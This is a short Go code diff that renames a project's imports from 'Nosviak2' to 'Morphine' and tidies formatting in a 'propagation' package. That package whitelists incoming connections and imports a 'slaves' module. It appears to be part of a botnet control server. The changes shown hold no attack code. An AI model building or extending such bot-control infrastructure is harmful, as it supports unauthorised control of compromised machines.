@@ -1,9 +1,9 @@
 package propagation
 
 import (
-	"Nosviak2/core/slaves"
-	"Nosviak2/core/sources/layouts/toml"
-	"Nosviak2/core/sources/tools"
+	"Morphine/core/slaves"
+	"Morphine/core/sources/layouts/toml"
+	"Morphine/core/sources/tools"
 	"log"
 	"net"
 	"strconv"
@@ -12,15 +12,16 @@ import (
 
 var Reps map[string]int = make(map[string]int)
 
-//grabs the count from the connection properly
-//this will ensure its done without any errors happening
+// grabs the count from the connection properly
+// this will ensure its done without any errors happening
 func GrabCount(connection net.Conn) error { //err happening
 
 	//checks if server is inside the whitelist properly
 	//only accepts whitelisted server properly and ensures safely
 	if !tools.NeedleHaystackOne(toml.ConfigurationToml.Propagation.Whitelist, strings.Split(connection.RemoteAddr().String(), ":")[0]) {
 		log.Printf("[PROPAGATION] (unwhitelisted server has tried to connection) FROM: (%s)\r\n", connection.RemoteAddr().String())
-		connection.Close(); return nil //drops connection properly and safely
+		connection.Close()
+		return nil //drops connection properly and safely
 	}
 
 	//lets the main server know about the connection
